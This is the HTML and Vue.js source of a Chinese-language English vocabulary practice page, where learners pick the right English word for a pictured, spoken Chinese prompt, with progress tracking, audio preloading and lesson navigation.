<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="description" content="单词学习">
    <meta name="keywords" content="单词学习 练习">
    <meta name="keywords" content="学习无边界，乐在海中游">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <title>练一练 英语 培训 单词学习</title>
    <link rel="stylesheet" crossorigin="anonymous"
        href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.6.1/css/bootstrap.min.css">
    <link rel="stylesheet" crossorigin="anonymous"
        href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.1/animate.min.css">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intro.js/7.0.1/introjs.min.css">
    <style>
        @media (min-width: 0px) {
            html {
                font-size: 0.9rem;
            }
        }

        @media (min-width: 576px) {
            html {
                font-size: 1rem;
            }
        }

        @media (min-width: 768px) {
            html {
                font-size: 1rem;
            }
        }

        @media (min-width: 992px) {
            html {
                font-size: 1.25rem;
            }
        }

        @media (min-width: 1200px) {
            html {
                font-size: 1.25rem;
            }
        }

        .glassbga {
            /*渐变*/
            background: linear-gradient(to right bottom, rgba(255, 255, 255, 0.7), rgba(255, 255, 255, 0.2));
            ;
            border-radius: 1rem;
            box-shadow: 6px 6px 10px rgba(112, 112, 112, 0.2);
        }

        .glassbg {
            background: linear-gradient(to right top, #65dfc9, #9ec7ce);
            border-radius: 1rem;
        }

        .circle-ab {
            background: linear-gradient(to right bottom, rgba(255, 255, 255, 0.7), rgba(255, 255, 255, 0.2));
            height: 14rem;
            width: 14rem;
            position: absolute;
            border-radius: 50%;
            opacity: 0.3;
        }

        .circle1 {
            top: 0%;
            right: 13%;
            z-index: -1;
        }

        .circle2 {
            bottom: 6%;
            left: 13%;
            z-index: -1;
        }

        .center {
            position: absolute;
            left: 50%;
            top: 10%;
            transform: translate(-50%, -50%);
        }

        [v-cloak] {
            display: none;
        }

        div.introjs-tooltip-header,
        div.introjs-tooltiptext {
            color: #616161 !important;

        }
    </style>
</head>
<!--
     swiper 展示
-->

<body id="q-app" class=" glassbg text-white  " onbeforeunload="  gd.storage.set('page', 1) ">
    <!--悬浮球-->
    <div class="circle1 circle-ab"> </div>
    <div class="circle2 circle-ab"></div>
    <!---上面的结果框val--->
    <div v-cloak class="container ">
        <!--题列表-->
        <div class=" row justify-content-center ">
            <div class="w-100 mt-5 d-none d-md-block"><!---高度垫子 小设备隐藏--></div>
            <div class=" row col-12 flex-wrap  bg-secondary glassbga  d-flex justify-content-center ">
                <span v-for="(site, index) in pd.testLs"
                    :class="[{'badge-info': (index+1  == pd.page )}, {' text-center': (index  != pd.page )} ,{'btn ':(index+1  != pd.page )}]"
                    class=" my-1  col-1 badge   badge-secondary mx-1  px-1 my-2"
                    @click="er.emit('跳转',index+1) ">{{index+1}}</span>
            </div>
        </div>
    </div>
    <div class="container ">
        <div class="mt-2 row justify-content-center  ">
            <div class="w-100 mb-3   d-none d-md-block"><!---高度垫子 小设备隐藏--></div>
            <div>
                <h4>选择对应的英文单词</h4>
            </div>

        </div>
    </div>
    <!--卡片-->
    <div v-cloak class=" container-md   glassbga  pt-md-5  pb-md-5 pt-sm-1  pb-sm-1">

        <div class=" row   align-items-center   justify-content-around   ">
            <img v-bind:src="pd.row.img" style="max-width:100%;overflow:hidden;" sytle="clear:both" class="img-fluid"
                v-bind:style="{ visibility: pd.selectedCss  }">
        </div>
        <!---nan文字-->
        <div class=" row   align-items-center   justify-content-around" style="height: 80px;">
            <div class=" col-6  row     justify-content-around">
                <button @click="er.emit('播放',0) "
                    class="btn ml-sm-5 mx-sm-2   px-sm-5 shadow  badge-secondary badge   badge-pill">
                    <h3 class="text-nowrap"> {{pd.row.zh || 中文}} </h3>
                </button>
            </div>
            <div class=" col-6  row     justify-content-around ">
                <button @click="er.emit('播放',1) "
                    class="btn mr-sm-5 mx-sm-2   px-sm-5    shadow   badge-info badge   badge-pill">
                    <h3 class="text-nowrap">{{pd.row.en || 英文}} </h3>
                </button>
            </div>
        </div>
        <!---nan音频-->
        <div class=" d-flex    align-items-center  justify-content-around " style="height: 80px;">

            <span class="  w-50  ml-sm-5 mx-sm-2     shadow   badge-info   badge badge-pill">
                <audio onloadeddata="er.emit('预加载',12) " onerror="er.emit('资源载入失败',event)" onended="er.emit('播放完成',0) "
                    class="  w-100   " controls="controls" v-bind:src="pd.row.zh4mp3">
                    Your browser does not support the audio element.
                </audio>
            </span>
            <span class="  w-50    mr-sm-5 mx-sm-2     shadow   badge-info badge   badge-pill">
                <audio onended="er.emit('播放完成',1) " onerror="er.emit('资源载入失败',event)" class="  w-100   "
                    controls="controls" v-bind:src="pd.row.en4mp3">
                    Your browser does not support the audio element.
                </audio>
            </span>
        </div>

    </div>
    <div class=" container-md">
        <p>从下面的单词中选择认为正确的 </p>
    </div>
    <!--选区-->
    <div v-cloak class=" container-md    glassbga    mb-sm-4    mb-1  pt-3  pb-3">
        <div class="  row  align-items-center  justify-content-center   ">

            <div v-for="(site, index) in pd.choose"
                class=" col-6  col-sm-3  my-1 my-sm-1 row  align-items-center  justify-content-center">
                <label class="text-dark  mx-1   mx-sm-1   px-sm-2    ">{{ index +1 }} </label>
                <span @click="er.emit('播放-候选',{'play':index+2,'word': site}) "
                    class="btn mr-1 mr-sm-2 mr-sm-1   px-2 shadow  badge-info badge-pill">
                    <h4 class="flex-wrap"> {{ site }} </h4>
                </span>
            </div>

        </div>

    </div>
    <!---加载区xxxxxxxxxx--->
    <div v-if=" pd.unload " style=" visibility: hidden; max-width:100%; height: 1px;">
        <div v-for="(site, index) in pd.chooseRow">
            <img onload="er.emit('预加载',11) " v-bind:src="site.img">
            <audio onloadeddata="er.emit('预加载',11) " onerror="er.emit('资源载入失败',event)" class="  w-25  "
                controls="controls" v-bind:src="site.en4m2mp3">
                Your browser does not support the audio element.
            </audio>

        </div>

    </div>


    <!--功能选择--->
    <div class="fixed-bottom row justify-content-center rounded   ">
        <div class="mt-2 row justify-content-center  ">

            <div class="container   ">
                <ul class="nav nav-tabs">
                    <li class="nav-item">
                        <a class="nav-link shadow  bg-secondary   text-white  px-lg-5 mx-md-2 mx-lg-5   "
                            v-bind:href="'./learnword.html?t='+pd.type+'&p='+pd.pid">学一学</a>
                    </li>
                    <li class="nav-item" id="prac">
                        <a class="nav-link shadow  bg-info text-white  px-lg-5 mx-md-2 mx-lg-5 active"
                            v-bind:href="'./pracword.html?t='+pd.type+'&p='+pd.pid">练一练</a>
                    </li>
                    <li class="nav-item" id="test">
                        <a class="nav-link shadow   bg-secondary  text-white  px-lg-5 mx-md-2 mx-lg-5"
                            v-bind:href="'./testword.html?t='+pd.type+'&p='+pd.pid">试一试</a>
                    </li>
                </ul>
            </div>
        </div>
    </div>

    <!---侧边栏 -->
    <transition v-cloak enter-active-class="animated fadeInLeft" leave-active-class="animated fadeOutLeft">
        <nav v-if="pd.showNav " class="    d-flex   bg-light"
            style="z-index:1082; top:0;left:0;width: 220px; height: 100vh; position: fixed;  ">
            <ul style="overflow-y: scroll;  width: 100vh; " >
                <li class="nav-item ">
                    <a class="nav-link" href="#">目录 </a>
                </li>
                <li v-for="(site, index) in pd.leftList" class="nav-item  "
                    :class="[{'bg-warning  glassbga': (site.f  == pd.pid )} ]">
                    <a class="nav-link" v-bind:href="site.url">第{{site.f}}课</a>
                </li>

            </ul>
        </nav>
    </transition>
    <!---info提示信息--->
    <transition v-cloak mode="out-in" enter-active-class="animated pulse" leave-active-class="animated fadeOut">
        <div class=" container-sm  fixed-top    " style="z-index: 1083 ;" v-for="site in pd.info_list">
            <div class="alert  alert-warning alert-dismissible fade show" role="alert">
                <strong>{{site.type}}</strong>{{ site.info }}
                <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
        </div>
    </transition>


    <!---载入动画--->
    <transition leave-active-class="animated fadeOut">
        <div v-if="pd.sp==0?false:true"
            class="center w-100 mt-5  px-3  row d-flex  clearfix  align-items-center  justify-content-center  "
            style="z-index: 1082  ;">
            <div class="spinner-border   "></div>
        </div>
    </transition>
    <!---进度条---->
    <transition v-cloak>
        <div v-if="pd.showProgress" class="center w-75   px-3   " style="z-index: 1082 ; ">
            <div class="progress">
                <div class=" progress-bar  progress-bar-striped progress-bar-animated  "
                    v-bind:style="{ width: pd.vprogress+'%' , }">{{pd.vprogress}}%</div>
            </div>
        </div>
    </transition>
    <!---遮罩1024--->

    <div v-if="pd.showLoading" @click="er.emit('遮罩',0) " style="z-index: 1081  ;" class=" modal-backdrop show "> </div>

    <!---对错判断标签--->
    <transition v-cloak enter-active-class="animated flash">
        <div v-cloak v-if="pd.showJudgment == 0" class="center text-success rounded-circle border glassbg  border-5"
            style="font-size:55px; z-index:1082; top:35%;    ">
            ✔
        </div>
    </transition>


    <transition v-cloak enter-active-class="animated flash">
        <div v-cloak v-if="pd.showJudgment == 1" class="center text-danger rounded-circle border  glassbg  border-5"
            style="font-size:55px;z-index:1082; top:35%;    ">
            ❌
        </div>
    </transition>


    <!----确认框---->
    <transition v-cloak enter-active-class="animated fadeIn" leave-active-class="animated fadeOut">
        <div v-cloak v-if="pd.showConfirm" class="center" style="z-index:1082; top:45%;    ">
            <div class="modal-dialog shadow" role="document">

                <div class="text-dark  modal-content">
                    <div class="modal-body">
                        <p>中文 "{{pd.row.zh}}"" 英文是 "{{ pd.row.en}}"</p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary">确定</button>
                        <button @click="pd.showConfirm = 0  " type="button" class="btn btn-secondary"
                            data-dismiss="modal">关闭</button>
                    </div>
                </div>
            </div>
        </div>
    </transition>
    <!-- 齿轮修改 --->
    <div class=" d-flex w-25  fixed-bottom justify-content-between  ">

        <span @click="er.emit('导航',1) " class="  d-none  btn     justify-content-end      "
            style="font-size:28px;    ">⚙</span>
        <button id="leftMenu" @click="er.emit('导航',1) " class="navbar-light  navbar-toggler">
            <span class="navbar-toggler-icon"></span>
        </button>
    </div>




    <script src="https://cdnjs.cloudflare.com/ajax/libs/vue/3.2.47/vue.global.prod.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/lodash.js/3.9.3/lodash.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/EventEmitter/5.2.8/EventEmitter.min.js"></script>
    <!-- script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script -->
    <!--script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.6.1/js/bootstrap.min.js"></script  -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/URI.js/1.19.11/URI.min.js"></script>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/intro.js/7.0.1/intro.min.js"></script>


    <script>
        const er = new EventEmitter //事件线
        const { onMounted, emits, createApp, ref, watch, computed } = Vue

        const gd = {};//全局数据 解决调用引用问题
        gd.reg = {} //组成类到全局调用
        gd.group = 'eng'
        gd.storage = {
            //本地浏览器 存取组件
            set(key, value, area) {
                key = area ? area + ':' + key : key;//分区域分区组
                key = gd.group + '.' + key;//分组
                localStorage.setItem(key, JSON.stringify(value));
            },
            get(key, area) {
                key = area ? area + ':' + key : key;//分区域分区组
                key = gd.group + '.' + key;//分组
                return JSON.parse(localStorage.getItem(key));
            },
            remove(key, area) {
                key = area ? area + ':' + key : key;//分区域分区组
                key = gd.group + '.' + key;//分组
                localStorage.removeItem(key);
            },
        }
        gd.pd = ref({ "load": [] });;//page data 页面元素引用"数据"

        //const pd = ref({ "load": [] }); //特殊变量，页面数据
        const pvs = gd.pd.value; //变量代理访问
        //gd.pd = pd;//page data 页面元素引用"数据"

        class pgui {
            /* 界面控制类 初始化界面默认值 */
            constructor(arg) {
                //初始（值）
                gd.reg.ui = this//全局资源
                //--界面值
                pvs.load.unshift('pgui')//从开头添加一个值
                pvs.sp = 0; //遮罩路由 (0.无，1.名单，2.登入 ,3.管理)
                pvs.row = {};//单词数据的一行
                pvs.showNav = 0;//导航显示
                pvs.showLoading = 0 //遮罩
                pvs.total = 0
                pvs.page = gd.storage.get('page') ? gd.storage.get('page') : 1;//显示动画
                pvs.info_list = []//{info:"2",type:"2"}
                pvs.vprogress = 100 //进度条
                pvs.showProgress = 0 //进度条
                //----页面参数
                pvs.url = new URI() //获取去 type，pid ，默认访问本站，数据加载主站
                //选择的单词
                pvs.unload = 1 //预加载后隐藏
                pvs.selected = '' //选择的单词
                pvs.selectedCss = 'hidden' //选择的单词
                pvs.wordLen = 9 //联系词数
                //确认
                pvs.showConfirm = 0//确认检查
                pvs.showJudgment = -1//判断对错
                pvs.testLs = []
                pvs.leftList = {} //左侧列表
                this.init();
                pvs.loadNum = 6 //4 + 2 
                pvs.reload = 3
                pvs.timeOut = 6
            }
            init() {
                //初始（设置）

                er.on('遮罩', this.loginLoading)
                er.on('播放', this.play)
                er.on('播放-候选', this.playChoose)


                er.on('进度', this.progress)
                er.on('预加载', this.progress)//预加载
                er.on('导航', this.trunNav)

                er.on('跳转', this.toPage)
                er.on('播放完成', this.endPlay)
                er.on('帮助.更多学习内容', this.help2next)
                er.on('资源载入失败', this.setReload)//预加载
            }
            setReload(evt) {
                console.log('---资源载入失败---', evt)

            }
            aoutReload(t) {
                const ui = gd.reg.ui

                // t =1 开启 ，t=0 结束
                console.log('aoutReload == ', t)
                if (t == 0) { clearTimeout(pvs.outId); return }
                pvs.loaded = 0 //重新加载新数据
                //---
                var ag = new URI().query(true)
                console.log('1.url == ', ag)

                if (ag.reload && Math.trunc(ag.reload) > pvs.reload) {
                    console.log('2.url == ', ag)
                    ui.loginLoading(0)
                    ui.spto(0)
                    ui.showInfo('加载资源失败', '稍后重试')

                    return
                }
                if (!ag.reload) {
                    ag.reload = 1
                    ag.page = pvs.page
                } else {
                    ag.reload = Math.trunc(ag.reload) + 1
                }
                //创建超时
                pvs.outId = setTimeout(() => {
                    console.log('3.url == ', ag)
                    window.location.href = pvs.url.query(ag);
                }, pvs.timeOut * 1000)
            }
            endPlay(n) {
                //对错判断后的播放完成
                const that = gd.oui
                //选择后 播放结束
                console.log('endPlay', n)
                if (!pvs.selected) {
                    return 0
                }

                //直接进入判断
                var row = _.find(dataFromJSON.data, { "en": pvs.row.en })//取数据 内部的一行
                //console.log(row, pvs.row,pvs.selected)
                //pvs.row 界面显示的数据
                if (pvs.selected == pvs.row.en && row.zh == pvs.row.zh) {
                    pvs.showJudgment = 0 //答对
                    if (pvs.page == pvs.testLs.length) {
                        //完成学习  +++  时间停止功能
                        setTimeout(() => {
                            that.showInfo('恭喜 完成了练习', '真棒 ');
                            pvs.showJudgment = -1 //判断结果重置
                            setTimeout(() => er.emit('帮助.更多学习内容'), 1800);
                            //完成提示进入挑战+++

                        }, 1500);
                    } else {
                        setTimeout(() => { that.toPage(pvs.page + 1) }, 1500);
                    }
                } else {
                    pvs.showJudgment = 1//打错
                }
            }
            playChoose(dc) {
                // 播放选择
                const that = gd.oui
                var row = _.find(dataFromJSON.data, { "en": dc.word })
                console.log('playChoose', dc, row)
                //设置值
                pvs.selected = dc.word
                pvs.selectedCss = ''//显示

                pvs.showJudgment = -1 //判断结果
                pvs.row.en = dc.word
                pvs.row.img = that.mkPath(row.en) + row.img
                pvs.row.en4mp3 = that.mkPath(row.en) + row.en4m2mp3

                setTimeout(() => { that.play(1) }, 150)
                //that.play(dc.play)


            }
            trunNav(n) {
                //切换导航栏
                const that = gd.oui
                pvs.showNav = n
                pvs.showLoading = n
            }

            loadJson() {
                //一次性加载 json数据  默认数据来源当前站点，当前没有访问主站

                const that = gd.oui

                that.progressVal(6)
                var src = pvs.url.host();//本站
                var dc = pvs.url.query(true);//参数
                pvs.page = dc['page'] ? dc['page'] : gd.storage.get('page') ? gd.storage.get('page') : 1;//
                pvs.type = dc['t'] ? dc['t'] : gd.storage.get('pageType') ? gd.storage.get('pageType') : 'camb_word';//业务类型，url优先
                pvs.pid = String(dc['p'] ? dc['p'] : gd.storage.get('pid', pvs.type) ? gd.storage.get('pid', pvs.type) : 365);//对应id，url优先
                pvs.rpid = String(pvs.pid).padStart(3, '0'); //补全id定长  /0/5/5.json  /1/5/15.json  
                gd.storage.set('pageType', pvs.type)
                gd.storage.set('pid', pvs.pid, pvs.type) //记录当前项目的学习课程号

                console.log("script参数=", src, pvs.type, pvs.pid)
                //document.getElementById('dataFromJson').remove ()
                // delete  dataFromJSON .data
                // 添加数据json元素

                var st = document.createElement("script");
                st.id = 'dataFromJson';
                st.src = `//${src}/${pvs.type}/${pvs.rpid.substring(pvs.rpid.length - 2, pvs.rpid.length - 1)}/${pvs.rpid.substring(pvs.rpid.length - 1)}/cfg_${pvs.pid}.js`
                //'https://disk.17121.top/camb_word/6/5/365/cfg_365.json';
                // 'https://p_disk.17121.top/camb_word/6/5/365/cfg_365.json'; //经过代理
                st.onerror = that.signErr;
                st.onload = that.endJson;
                //console.log(dataFromJSON)
                document.body.appendChild(st);
                console.log("添加script标签=", pvs.page)
                //词展示++++
                that.loginLoading(1) //loading 
                that.spto(1) //loading 
                //leftList  加载左侧菜单
                var wl = document.createElement("script");
                wl.src = `//${src}/${pvs.type}/word_list.js`
                wl.onload = that.leftListLoad;
                document.body.appendChild(wl);

            }
            endJson(dat) {

                // 读取数据到 json/翻页    页面
                console.log('dat==', dat)
                const that = gd.oui
                if (typeof (dataFromJSON) == "undefined" || dataFromJSON.data.length == 0) { that.showInfo("没找到数据", '翻页'); return; } //没数据
                that.loginLoading(1) //内部翻页 
                that.spto(1) //loading 
                //词展示++++
                pvs.testLs = _.slice(_.shuffle(dataFromJSON.data), 0, pvs.wordLen)//测试数
                //pvs.testLs = dataFromJSON.data
                pvs.total = pvs.testLs.length
                that.rowLoad(1) //处理 显示第一个单词

            }

            getPage() {
                // 超限 问题处理
                var page = pvs.page
                page = parseInt(page);
                if (page <= 0) { page = 1; }
                if (page > pvs.total) { page = pvs.total; }
                gd.storage.set('page', page);
                pvs.page = page
                return page;

            }
            toPage(n) {
                if (pvs.page == n) { return; }
                const that = gd.oui

                //跳转到某页面
                pvs.page = parseInt(n);
                //---处理
                gd.storage.set('page', pvs.page)
                that.progressVal(6)
                //载入数据 
                that.rowLoad(1)
                //--重新初始化
                pvs.unload = 1 //允许预加载mp3 图片
                pvs.showJudgment = -1 //选择判断结果
                pvs.selected = '' //选择的单词
                pvs.selectedCss = 'hidden' //选择的单词
            }

            help2next() {
                var setpList = [
                    {
                        title: '<em>新挑战 </em>',
                        element: document.querySelector('#test'),
                        intro: '来接受另一种模式的挑战吧',
                    },

                ];
                var helpOpt = {
                    nextLabel: '下一个  &rarr;',    // 下一个按钮文字
                    prevLabel: '&larr; 上一个',     // 上一个按钮文字
                    doneLabel: '好',           // 完成按钮文字
                    exitOnOverlayClick: false,  // 点击叠加层时是否退出介绍
                    showStepNumbers: false,     // 是否显示红色圆圈的步骤编号
                    disableInteraction: true,   // 是否禁用与突出显示的框内的元素的交互，就是禁止点击
                    showBullets: false          // 是否显示面板指示点
                }
                helpOpt['steps'] = setpList
                introJs().setOptions(helpOpt).start();

            }
            play(n) {
                //播
                console.log('播放=', n)
                //播放指定 document.querySelectorAll('audio')[0].play()
                document.querySelectorAll('audio')[n].play()
            }
            loginLoading(n) {
                //登入中效果
                pvs.showLoading = n
                if (pvs.showLoading == 0) { pvs.showNav = 0 }
            }
            spto(n) {
                //遮罩和二级界面
                /*切换界面*/
                pvs.sp = n
            }
            progressVal(n) {
                //直接设置值
                const that = gd.oui
                pvs.vprogress = n
                that.progress(0)
            }
            progress(n) {
                const that = gd.oui
                //进度  0 和 100 都隐藏
                pvs.vprogress = pvs.vprogress + n
                console.log("进度", n, pvs.vprogress)
                if (pvs.vprogress > 98) {
                    pvs.vprogress = 100
                    that.aoutReload(0) //结束计时
                    pvs.unload = 0 //加载完不显示 删除元素
                    setTimeout(function () { pvs.showProgress = 0 }, 155);
                    that.spto(0)
                    that.loginLoading(0)
                } else {
                    pvs.showProgress = 1 //未加载
                }
            }

            showInfo(info, type = '') {
                //结果提示信息 （数据驱动）
                //添加数据，来添加提示
                pvs.info_list.push({ "info": info, "type": type })
                //缺少动效
                setTimeout(function () { pvs.info_list.splice(0, 1); }, 4000);
            }
            signErr(error) {
                //登入错误处理
                const that = gd.oui

                console.log('Error:', error); //提示框
                that.loginLoading(0) //loading 
                that.spto(0) //loading  
                that.showInfo('无法加载到数据，刷新重试', '载入数据：') //loading  
            }
            leftListLoad(dat) {
                //单词列表加载
                console.log('leftListLoad=', pvs.url.filename(), wordList)
                pvs.leftList = wordList.data
                pvs.leftList = _.map(pvs.leftList, (o) => { o.url = './' + pvs.url.filename() + `?p=${o.f}&t=${pvs.type}`; return o })

            }
            rowLoad(n) {
                // 读取数据到 json/翻页    页面
                console.log('rowLoad==', n)
                const that = gd.oui

                that.progressVal(6)
                that.loginLoading(1) //内部翻页 
                that.spto(1) //loading 
                that.aoutReload(1)//开始超时即时


                //设置数据
                console.log(dataFromJSON.src, pvs.page, dataFromJSON.data[that.getPage() - 1])
                var row = pvs.testLs[that.getPage() - 1]
                //创建选区
                pvs.choose = that.mkchoose(row, dataFromJSON.data)
                //设置 mp3
                pvs.row.zh = row.zh
                pvs.row.en = "?"// row.en
                pvs.row.zh4mp3 = that.mkPath(row.en) + row.zh4m2mp3
                pvs.row.en4mp3 = that.mkPath(row.en) + row.en4m2mp3
                pvs.row.img = that.mkPath(row.en) + row.img
                //pvs.row.imgx = `//${pvs.url.host()}/${pvs.type}/choose.png` //?q=${ new Date().valueOf() }

                //  加载5组10个音图文件（异步）
                pvs.chooseRow = []//初始化清空
                setTimeout(function () { that.loadChoose(); }, 150); //生成
            }
            mkPath(wrod) {
                return `//${pvs.url.host()}/${pvs.type}/${wrod.substring(0, 1).toLowerCase()}/${wrod.substring(1, 2).toLowerCase()}/`
            }
            loadChoose() {
                //预加载
                const that = gd.oui

                
                //pvs.chooseRow = _.filter(dataFromJSON.data, function (o) { return pvs.choose.indexOf(o.en) >= 0; });//无序
                pvs.chooseRow = _.map(pvs.choose, function (o) { return _.find(dataFromJSON.data, { "en": o }); });//有序

                pvs.chooseRow = _.cloneDeep(pvs.chooseRow) //深度拷贝 
                pvs.chooseRow = _.map(pvs.chooseRow, function (o) {
                    //计算长路径  免缓存
                    o.en4m2mp3 = that.mkPath(o.en) + o.en4m2mp3;
                    o.img = that.mkPath(o.en) + o.img;
                    return o;
                }
                );
            }
            mkchoose(row, dat) {
                //创建 选区单词
                var ls = [row.en]

                var count = Math.min(4, dat.length)
                var tmp = ''
                while (!(ls.length >= count)) {
                    tmp = _.sample(dat).en
                    if (_.include(ls, tmp)) {
                        continue//不重复
                    }
                    ls.push(tmp)
                }
                //_.find(ls, ['a']);//???
                return _.shuffle(ls)
            }

            watchPg(newValue, oldValue) {
                //watch
                //console.log('gd pagedata 被修改', newValue.page, oldValue.page)
                //console.log('gd pagedata 被修改\n', newValue, '\n', oldValue)
            }
        }
        //----------开始
        let appdat = {
            setup() {
                const oui = new pgui(); //界面更改"方法"
                //const ocls = new cls(12);//默认选择
                //---放入全局解决this问题
                //gd.ocls = ocls; //抽奖类
                //gd.oin = oin; //通信逻辑
                gd.oui = oui; //ui界面
                watch(gd.pd, oui.watchPg, { deep: true });
                //computed(() => { return JSON.parse(JSON.stringify(pvs)); }); //对值二次计算
                //onMounted(() => ocls.bindEvt()); //窗口大小变动事件
                //onMounted(() => oui.remount()); //已经登入刷新处理
                onMounted(() => oui.loadJson(0)); //已经登入刷新处理
                //--变量关联到html的映射 js访问要加.value
                return { er, oui, "pd": gd.pd, "ref_login_manage": gd.pd.refManageEmt, }
            }
        }
        const app = createApp(appdat)
        //app.use(Quasar) //vue的ui
        app.mount('#q-app')
    </script>



    <script>
            (() => setTimeout(() => {
                var script = document.createElement("script");
                script.src = 'https://an.17121.top/';
                document.body.append(script)
            }, 300))()


    </script>
</body>

</html>